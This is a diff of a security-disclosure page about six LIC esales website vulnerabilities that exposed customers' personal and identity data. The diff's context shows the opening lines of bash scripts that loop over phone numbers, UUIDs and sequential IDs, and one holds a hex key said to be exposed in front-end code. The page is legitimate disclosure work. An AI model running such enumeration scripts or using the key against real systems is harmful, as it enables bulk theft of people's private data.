@@ -2,7 +2,7 @@
 title: LIC cyber vulnerabilities and data breaches 2024-2025
 date:
   created: 2025-08-11
-  updated: 2025-08-20
+  updated: 2025-09-12
 ---
 
 The Life Insurance Corporation of India (LIC) had 6 vulnerabilities in October 2024, December 2024 and April 2025 in their <https://esales.licindia.in> website (developed by [iNube software solutions](https://inubesolutions.com/)). Two of them allowed serial access to policy forms of prospect customers containing  Name, DOB, email, phone, PAN card, income tax forms, aadhaar (or other IDs), signature, photo, medical history, address, income, nominees, other policy purchase details, etc.
@@ -80,7 +80,7 @@ Discovered and reported on 16th October 2024. ~~Fixed~~ covered up on 23th Octob
 Accepted phone number and provided email, DOB, proposal document number which can be used
 in other APIs to get more data.
 
-```bash title="sample_script.sh" linenums="1"
+```bash title="sample_script.sh" linenums="1" hl_lines="7"
 #!/bin/bash
 for phone in "0000000000"
 do
@@ -109,7 +109,7 @@ The bearer token, as visible on [jwt.io](https://jwt.io/), was valid for three y
 
 Discovered and reported on 31 December 2024. Fixed on 19 February 2025.
 
-```bash title="sample_script.sh" linenums="1"
+```bash title="sample_script.sh" linenums="1" hl_lines="20"
 #!/bin/bash
 # Hexadecimal key exposed in the front-end code.
 KEY="3539613231367a34394b336235384434"
@@ -151,7 +151,7 @@ done
 
 Accepted a UUID user ID
 
-```bash title="sample_script.sh" linenums="1"
+```bash title="sample_script.sh" linenums="1" hl_lines="6"
 #!/bin/bash
 for id in '$$$$$$$$-$$$$-$$$$-$$$$-$$$$$$$$$$$$';
 do
@@ -177,7 +177,7 @@ done
 
 Accepted a JSON payload with an encrypted `Application_ID`. The API returned a JSON object with the details of the proposal, including the proposer details, risk items, and channel details.
 
-```bash title="sample_script.sh" linenums="1"
+```bash title="sample_script.sh" linenums="1" hl_lines="8"
 #!/bin/bash
 for ((opp_ids=1252200; opp_ids<=1252210; opp_ids++)) ;
 do
